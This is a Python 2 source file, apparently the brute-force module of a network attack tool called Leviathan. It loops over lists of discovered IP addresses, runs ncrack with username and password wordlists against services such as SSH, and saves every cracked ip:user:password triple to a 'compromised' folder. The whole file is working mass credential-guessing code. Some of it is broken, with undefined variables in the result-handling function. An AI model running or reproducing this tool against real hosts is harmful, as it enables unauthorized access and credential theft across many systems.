import os
import sys
from time import sleep
from subprocess import check_output
import glob
from leviathan_config import BASE_DIR
from utils import get_possible_protocols_files, select_protocol, get_protocol_info, get_command, printProgressBar, timeout


def brute_force(discovery_id):
    cracked_list = []
    filename = os.path.join(BASE_DIR, 'assets', 'discovered', '*' + discovery_id + '.txt')
    possible_protocols, files = get_possible_protocols_files(filename)
    if len(files) > 1:
        protocol = select_protocol(possible_protocols)
        if protocol:
            filename = os.path.join(BASE_DIR, 'assets', 'discovered', protocol + '_' + discovery_id + '.txt')
        else:
            return
    elif files:
        filename = files[0]
        protocol = possible_protocols[0]
    else:
        msg = "There is no asset with this Discovery ID: %s" % discovery_id
        return msg

    port, user_list, pass_list = get_protocol_info(protocol)
    if port and user_list and pass_list:
        user_fullpath = os.path.join(BASE_DIR, 'config', 'wordlists', user_list)
        pass_fullpath = os.path.join(BASE_DIR, 'config', 'wordlists', pass_list)
        ip_fullpath = os.path.join(BASE_DIR, 'config', 'wordlists', filename)

        with open(ip_fullpath, "r") as ipfile:
            iplist = ipfile.readlines()
            for ipaddress in iplist:
                try:
                    brute_force_by_ip(ipaddress, user_fullpath, pass_fullpath, ip_fullpath, protocol, port)
                except KeyboardInterrupt:
                    break
                except:
                    print "Operation Timeout"
            else:
                return "Misformatted asset file %s.txt" % discovery_id

            print ""
            print "Finished"


def brute_force_specific(ip_address, port_number, protocol):
    cracked_list = []

    port, user_list, pass_list = get_protocol_info(protocol)

    if port_number and user_list and pass_list:
        user_fullpath = os.path.join(BASE_DIR, 'config', 'wordlists', user_list)
        pass_fullpath = os.path.join(BASE_DIR, 'config', 'wordlists', pass_list)
        ip_fullpath = None

        try:
            brute_force_by_ip(ip_address, user_fullpath, pass_fullpath, ip_fullpath, protocol, port_number)
        except KeyboardInterrupt:
            return
        except:
            print "Operation Timeout"

        print ""
        print "Finished"


@timeout(50)
def brute_force_by_ip(ipaddress, user_fullpath, pass_fullpath, ip_fullpath, protocol, port):
    ipaddress = ipaddress.strip("\n")
    print "\nTrying: " +ipaddress
    cmd = get_command(protocol, port, user_fullpath, pass_fullpath, ipaddress)
    output = check_output(cmd)
    output_list = output.split('\n')
    for line in output_list:
        clean_line = line.rstrip()
        if clean_line and clean_line[0].isdigit():
            tokens = clean_line.split(" ")
            if len(tokens) == 5:
                ip = tokens[0]
                protocol = tokens[2].split(":")[0]
                username = tokens[3].split("'")[1]
                password = tokens[4].split("'")[1]
                print "Cracked! " + ip + " " + username + " " + password
                cracked_list.append(ip+" "+username+" "+password)
                ncrack_file_name = "ncrack_%s_%s.txt" % (protocol, str(discovery_id))
                ncrack_file = os.path.join(BASE_DIR, 'assets', 'compromised', ncrack_file_name)
                with open(ncrack_file, "a") as cracked:
                    cracked.write("%s:%s:%s" % (ip, username, password))
                    cracked.write("\n")

# TODO: needs to be tested
def bruteforce_all(protocol):
    discovered_files_reg = os.path.join(BASE_DIR, 'assets', 'discovered', '*_' + protocol + '_*.txt')
    discovered_files = glob.glob(discovered_files_reg)
    for df in discovered_files:
        discoveryid = df.split("_")[2].split(".")[0]
        brute_force(discoveryid)

# bruteforce_all("ssh")
# brute_force("9717237")
# print message
